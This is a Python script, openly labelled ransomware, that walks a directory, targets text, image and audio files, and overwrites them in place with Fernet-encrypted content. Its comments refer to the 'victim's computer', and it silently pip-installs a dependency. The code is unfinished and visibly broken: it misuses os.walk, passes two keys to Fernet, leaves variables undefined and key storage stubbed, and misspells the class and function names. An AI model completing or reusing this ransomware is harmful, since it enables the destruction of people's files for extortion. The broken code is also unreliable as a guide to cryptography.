#!/usr/bin/env python3

'''
Name : Alexis Rodriguez

Start Date : 2020-02-18
End Date : 2020-02-


Description : 

'''

'''
Import subprocess for executing system commands.
In this program we'll use it to download the
cryptography module in case it is not
already installed on the victim's computer
'''
try:
	import subprocess as subp
	# Import time to pause execution of program
	# until cryptography module gets installed
	import time
	# Import os so that we can obtain all the file
	# in a specific directory
	import os
	# Import argparse to handle user arguments more conveniently
	import argparse
except ImportError:
	print('[-] There was an error importing a module')

# Try importing cryptography module class
try:
	from cryptography.fernet import Fernet
# If any errors occurs importing the cryp module
# installing it with the following command
except:
	subp.call('pip install cryptography', shell=True)
	# Wait 30 seconds before preceding with the programs
	time.sleep(30)
	# try importing again after attempting to install
	# the module
	from cryptography.fernet import Fernet

'''------------------------------------------------------------------------------------------------
									Ransomware Class Definition
---------------------------------------------------------------------------------------------------'''

class Ransomware:

	def __init__(self, directory='.',encrypt=True, key_file='fernet_key'):
		'''
		$ Declare encryption key value
		$ Get directory to encrypt/decrypt
		$ Get name of file to store key
		$ Get boolean to encrypt or decrypt files
		'''
		print("[+] Initiating ransomware declarations ")
		# --> Ferney key
		self.key=None
		# --> Fernet object
		self.linear_b=None
		# --> File extensions to encrypt
		self.file_ext_target=['.txt', '.jpg', '.png', '.mp3']
		# --> File where key is being stored if key exists in another file
		self.key_file=key_file
		# --> Directory that contains files we want to encrypt
		# --> Default directory is the current directory
		self.directory=directory

	def get_valid_files(self, directory):
		'''
		$ Find files that contain the extension specified in our file_ext_target list
		$ Returns a list that contains valid files to encrypt
		'''

		# --> List containing all files that end with the extensions
		# --> Defined in the file_ext_target's list 
		valid_files_to_encrypt = []

		# --> Os.walk will return as iterable that contains current directory,
		# --> Directories in the current directory, and all files in the current
		# --> directory
		for abs_path, _, file in os.walk(directory):
			# --> Check if the extensions of the file are valid
			if file[-4:] in self.file_ext_target:
				# --> Get full valid file path
				valid_file_path = os.path.join(abs_path, file)
				# --> Append valid file path to valid file list
				valid_files_to_encrypt.append(valid_file_path)

		return valid_files_to_encrypt

	def open_files_to_encrypt_or_decrypt(self, list_of_files, encrypt=True):
		'''
		$ Opening all files in the list of files argument
		$ and send the contents of these files to be encrypted
		'''
		print('[+] Opening all files to encrypt')

		for file in list_of_files:

			with open(file, 'r+') as f:

				file_content = f.read()
				# --> If encrypt argument is True, encrypt the contents of the files
				if encrypt:
					# ENCRYPT IT!!!!
					encrypted = self.encrypt(file_content)
				# --> If encrypt argument is False, decrypt the contents of the files
				else:
					# DECRYPT IT!!!!
					decrypted = self.decrypt(file_content)

				f.write(encrypted)

	def store_key(self, key_to_store):
		'''
		$ Store key in file for decryption
		'''
		print('[+] Storing key in file')
		pass
	
	def get_key(self):
		'''
		$ Retrieve the key for decryption
		'''
		print('[+] Retrieving key from file')
		pass
	
	def key_gen_fernet_instance(self):
		'''
		$ Generate encryption/decryption key
		$ Instantiate Fernet object
		'''
		print('Generating Fernet key')
		# --> Generating keys for encryption
		k1 = Fernet.generate_key()
		k2 = Fernet.generate_key()
		# --> Fernet object instantiation with two keys
		try:
			# --> create Fernet object
			self.linear_b = Fernet(k1, k2)
		except:
			# --> if it fails
			print('[-] Unable to instantiate Fernet object for encryption')

	def encrypt(self, to_encrypt):
		'''
		$ Encrypting all files in the directory stored in the directory variable
		'''
		print('[+] Encrypting all files in ' + self.directory + ' directory')

		# --> Return the encrypted version of the contents of a file
		return self.linear_b.encrypt(to_encrypt)


	def decrypt(self, to_decrypt):
		'''
		$ Decrypt all files in the directory stored in the directory variable
		'''
		print('[+] Decrypting all files in ' + self.directory + ' directory')
		# --> Return the decrypted data of an encrypted file
		return self.linear_b.decrypt(to_decrypt)

'''
******************
-------MAIN-------
******************
'''
def initaite():
	# --> Directory to encrypt
	dir_to_encyrpt = '.' # BE CAREFUL!!!
	# --> Instantiating Ransomware object
	instance = Ransonware(directory=dir_to_encyrpt)


# --> Check if the current module is main module
if __name__ == '__main__':
	print('''
		  ooo,    .---.
 o`  o   /    |\\________________
o`   'oooo()  | ________   _   _)
`oo   o` \\    |/        | | | |
  `ooo'   `---'         "-" |_|
	''')

	initiate()
